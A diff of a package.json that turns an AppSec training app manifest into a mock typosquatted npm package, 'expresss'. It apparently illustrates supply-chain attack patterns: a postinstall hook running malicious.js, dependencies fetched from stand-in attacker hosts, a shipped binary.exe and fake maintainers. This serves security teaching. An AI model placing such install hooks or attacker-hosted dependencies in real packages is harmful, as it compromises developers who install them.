@@ -1,20 +1,47 @@
 {
-  "name": "vulnerable-nodejs-app",
-  "version": "1.0.0",
-  "description": "Intentionally vulnerable Node.js application for AppSec training",
-  "main": "src/index.js",
+  "name": "expresss",
+  "version": "0.0.0",
+  "description": "",
+  "main": "index.js",
   "scripts": {
-    "start": "node src/index.js"
+    "preinstall": "echo 'This is a preinstall script that could be malicious'",
+    "postinstall": "node malicious.js",
+    "test": "echo \"Error: no test specified\" && exit 1"
   },
+  "author": "malicious@temp-mail.org",
+  "maintainers": [
+    {
+      "name": "Compromised User",
+      "email": "user@compromised-domain.com"
+    },
+    {
+      "name": "Unclaimed User",
+      "email": "user@unclaimed-domain.com"
+    }
+  ],
+  "license": "ISC",
   "dependencies": {
-    "express": "4.0.0",
-    "body-parser": "1.19.0",
-    "crypto": "1.0.1",
-    "xml2js": "0.4.0",
-    "express-session": "1.15.6",
-    "lodash": "4.17.0"
+    "express": "git+https://github.com/attacker/malicious-repo.git",
+    "legitimate-package": "1.0.0",
+    "another-package": "http://malicious-domain.com/package.tgz"
   },
-  "devDependencies": {},
-  "author": "",
-  "license": "MIT"
-}
+  "devDependencies": {
+    "test-package": "1.0.0"
+  },
+  "files": [
+    "index.js",
+    "malicious.js",
+    "binary.exe"
+  ],
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/legit/repo.git"
+  },
+  "bugs": {
+    "url": "https://github.com/legit/repo/issues"
+  },
+  "homepage": "https://github.com/legit/repo#readme",
+  "publishConfig": {
+    "registry": "https://registry.npmjs.org/"
+  }
+} 
